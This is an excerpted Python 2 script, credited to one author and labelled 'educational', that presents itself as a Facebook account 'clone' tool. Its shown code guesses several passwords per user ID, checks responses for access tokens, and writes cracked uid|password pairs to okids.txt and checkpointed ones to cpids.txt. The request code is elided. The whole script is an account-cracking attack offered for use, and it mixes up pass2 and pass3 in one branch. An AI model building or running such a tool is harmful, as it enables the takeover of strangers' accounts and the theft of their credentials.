#Script Given By REFAT SHAHRIAR
#Script Is Given For Educational Purpose
#Script Edited By @REFAT SHAHRIAR
#Utf-8 python 
...
def main():
    ...
    print ' \033[0m[2].\x1b[1;96m Follow On Facebook '
    print ' \033[0m[3].\x1b[1;96m New Channel Go & Sub Guyss '
    print ' \033[0m[0].\x1b[1;96m Exit And Fuck Tool \n'
    print ''
    log_sel()
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/LINKLAGLEAMAREBOL')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtube.com/channel/UC82aIUkhQPyBPosTRV-pyVA')
        main()
    else:
        print ''
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks REFAT SHAHRIAR
    print ''
    crack_select()
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks REFAT SHAHRIAR
    print 45 * '_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[REFAT-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[REFAT-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[REFAT-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[REFAT-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks REFAT SHAHRIAR
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks REFAT SHAHRIAR
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
